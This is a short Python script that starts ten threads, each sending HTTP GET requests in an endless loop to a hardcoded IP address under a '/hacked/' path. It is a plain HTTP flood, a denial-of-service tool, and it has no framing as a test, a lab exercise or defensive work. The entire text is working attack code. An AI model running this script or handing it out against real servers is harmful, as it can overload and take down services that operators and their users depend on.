

import threading # For creating multiple threads
import requests # For sending HTTP requests


target_url = "http://100.91.209.65/hacked/"

def send_requests():
    while True: # Keep sending requests indefinitely
        try:
            response = requests.get(target_url) # Send GET request
            print(f"Request sent: {response.status_code}")
        except Exception as e:
            print(f"Error: {e}") # Print any errors that occur
num_threads = 10 # Number of threads to simulate
threads = []
for i in range(num_threads): # Create threads
    thread = threading.Thread(target=send_requests)
    thread.start() # Start each thread
    threads.append(thread)
for thread in threads: # Wait for all threads to finish
    thread.join()